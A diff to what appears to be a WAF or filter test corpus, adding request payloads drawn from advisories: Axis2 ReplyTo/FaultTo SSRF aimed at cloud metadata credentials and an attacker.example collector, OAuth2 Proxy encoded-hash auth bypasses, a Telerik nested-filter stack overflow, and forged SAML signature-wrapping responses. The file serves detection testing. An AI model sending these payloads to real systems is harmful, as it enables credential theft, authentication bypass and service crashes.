@@ -5518,3 +5518,38 @@ POST /api/comment header="Content-Type: application/json" body="{\"comment\":\"<
 #     embed private or metadata IPv4 targets. ---
 POST /api/links header="Content-Type: application/json" body="{\"url\":\"http://[64:ff9b::a9fe:a9fe]/latest/meta-data/\"}"
 POST /api/links header="Content-Type: application/json" body="{\"url\":\"http://[2002:a9fe:a9fe::]/latest/meta-data/\"}"
+
+# --- 2026-11-13 delta intake: web-server, framework, and authentication
+#     library advisories with a published request shape. ---
+
+# --- CVE-2026-123753 (Apache Axis2/Java): a non-anonymous WS-Addressing
+#     ReplyTo or FaultTo makes Axis2 open a connection to the caller's
+#     address, reaching internal hosts and delivering the response off-host.
+#     Synchronous clients use the W3C anonymous endpoint. ---
+POST /axis2/services/Version header="Content-Type: text/xml" body="<?xml version=\"1.0\" encoding=\"UTF-8\"?><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\"><soapenv:Header><wsa:ReplyTo><wsa:Address>http://169.254.169.254/latest/meta-data/iam/security-credentials/</wsa:Address></wsa:ReplyTo></soapenv:Header><soapenv:Body><ns:getVersion xmlns:ns=\"http://axis.apache.org/axis2/java/core/\"/></soapenv:Body></soapenv:Envelope>"
+POST /axis2/services/Version header="Content-Type: text/xml" body="<?xml version=\"1.0\"?><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\"><soapenv:Header><wsa:FaultTo><wsa:Address>http://10.0.0.5:8080/internal</wsa:Address></wsa:FaultTo></soapenv:Header><soapenv:Body/></soapenv:Envelope>"
+POST /axis2/services/Version header="Content-Type: text/xml" body="<?xml version=\"1.0\"?><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><ReplyTo xmlns=\"http://www.w3.org/2005/08/addressing\"><Address>https://attacker.example/collect</Address></ReplyTo></soapenv:Header><soapenv:Body/></soapenv:Envelope>"
+
+# --- CVE-2026-41059 (OAuth2 Proxy): a number sign in the path, including
+#     the browser-safe encoded form %23, lets skip-auth rules match a
+#     different path from the one the backend serves. ---
+GET /public%23/admin/users
+GET /public/%23/admin/settings
+GET /files/report.pdf%23/admin
+GET /public%2523/admin
+
+# --- CVE-2026-106154 (Telerik UI for ASP.NET Core/MVC): the server-side
+#     FilterParser recurses without a depth limit, so a deeply nested filter
+#     value throws StackOverflowException during model binding. ---
+GET /api/orders?filter=((((((((((((((((Status~eq~'open'))))))))))))))))))
+GET /api/orders?$filter=((((((((((((((((Status~eq~'open'))))))))))))))))))
+POST /api/orders header="Content-Type: application/x-www-form-urlencoded" body="filter=((((((((((((((((Status~eq~'open'))))))))))))))))))"
+
+# --- 2026-11-14 SAML engine guard: signature wrapping, duplicate IDs, and the
+#     multi-assertion signature-confusion shape are decoded from base64 JSON or
+#     form bodies and rejected before forwarding. ---
+POST /saml/callback header="Content-Type: application/json" body="{\"SAMLResponse\":\"PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfcmVzcG9uc2UiIFZlcnNpb249IjIuMCIgSXNzdWVJbnN0YW50PSIyMDI2LTExLTE0VDAwOjAwOjAwWiI+PHNhbWw6SXNzdWVyPmh0dHBzOi8vaWRwLmV4YW1wbGU8L3NhbWw6SXNzdWVyPjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpSZWZlcmVuY2UgVVJJPSIjX290aGVyIi8+PC9kczpTaWduZWRJbmZvPjwvZHM6U2lnbmF0dXJlPjxzYW1sOkFzc2VydGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0iX2Fzc2VydGlvbiIgVmVyc2lvbj0iMi4wIj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD5tYWxsb3J5QGV4YW1wbGUuY29tPC9zYW1sOk5hbWVJRD48L3NhbWw6U3ViamVjdD48L3NhbWw6QXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U+\",\"RelayState\":\"state\"}"
+POST /saml/callback header="Content-Type: application/json" body="{\"SAMLResponse\":\"PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfcmVzcG9uc2UiIFZlcnNpb249IjIuMCIgSXNzdWVJbnN0YW50PSIyMDI2LTExLTE0VDAwOjAwOjAwWiI+PHNhbWw6SXNzdWVyPmh0dHBzOi8vaWRwLmV4YW1wbGU8L3NhbWw6SXNzdWVyPjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpSZWZlcmVuY2UgVVJJPSIjX3Jlc3BvbnNlIi8+PC9kczpTaWduZWRJbmZvPjwvZHM6U2lnbmF0dXJlPjxzYW1sOkFzc2VydGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0iX2Fzc2VydGlvbiIgVmVyc2lvbj0iMi4wIj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD5hbGljZUBleGFtcGxlLmNvbTwvc2FtbDpOYW1lSUQ+PC9zYW1sOlN1YmplY3Q+PC9zYW1sOkFzc2VydGlvbj48c2FtbDpBc3NlcnRpb24geG1sbnM6c2FtbD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiIgSUQ9Il9hc3NlcnRpb24iIFZlcnNpb249IjIuMCI+PHNhbWw6U3ViamVjdD48c2FtbDpOYW1lSUQ+bWFsbG9yeUBleGFtcGxlLmNvbTwvc2FtbDpOYW1lSUQ+PC9zYW1sOlN1YmplY3Q+PC9zYW1sOkFzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg==\",\"RelayState\":\"state\"}"
+POST /saml/callback header="Content-Type: application/json" body="{\"SAMLResponse\":\"PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfcmVzcG9uc2UiIFZlcnNpb249IjIuMCIgSXNzdWVJbnN0YW50PSIyMDI2LTExLTE0VDAwOjAwOjAwWiI+PHNhbWw6SXNzdWVyPmh0dHBzOi8vaWRwLmV4YW1wbGU8L3NhbWw6SXNzdWVyPjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpSZWZlcmVuY2UgVVJJPSIjX3Jlc3BvbnNlIi8+PC9kczpTaWduZWRJbmZvPjwvZHM6U2lnbmF0dXJlPjxzYW1sOkFzc2VydGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0iX2ExIiBWZXJzaW9uPSIyLjAiPjxzYW1sOlN1YmplY3Q+PHNhbWw6TmFtZUlEPmFsaWNlQGV4YW1wbGUuY29tPC9zYW1sOk5hbWVJRD48L3NhbWw6U3ViamVjdD48L3NhbWw6QXNzZXJ0aW9uPjxzYW1sOkFzc2VydGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0iX2EyIiBWZXJzaW9uPSIyLjAiPjxzYW1sOlN1YmplY3Q+PHNhbWw6TmFtZUlEPm1hbGxvcnlAZXhhbXBsZS5jb208L3NhbWw6TmFtZUlEPjwvc2FtbDpTdWJqZWN0Pjwvc2FtbDpBc3NlcnRpb24+PC9zYW1scDpSZXNwb25zZT4=\",\"RelayState\":\"state\"}"
+POST /saml/callback header="Content-Type: application/x-www-form-urlencoded" body="SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfcmVzcG9uc2UiIFZlcnNpb249IjIuMCIgSXNzdWVJbnN0YW50PSIyMDI2LTExLTE0VDAwOjAwOjAwWiI%2BPHNhbWw6SXNzdWVyPmh0dHBzOi8vaWRwLmV4YW1wbGU8L3NhbWw6SXNzdWVyPjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpSZWZlcmVuY2UgVVJJPSIjX290aGVyIi8%2BPC9kczpTaWduZWRJbmZvPjwvZHM6U2lnbmF0dXJlPjxzYW1sOkFzc2VydGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0iX2Fzc2VydGlvbiIgVmVyc2lvbj0iMi4wIj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD5tYWxsb3J5QGV4YW1wbGUuY29tPC9zYW1sOk5hbWVJRD48L3NhbWw6U3ViamVjdD48L3NhbWw6QXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U%2B&RelayState=state"
+POST /saml/callback header="Content-Type: application/x-www-form-urlencoded" body="SAMLResponse=not-base64!&RelayState=state"
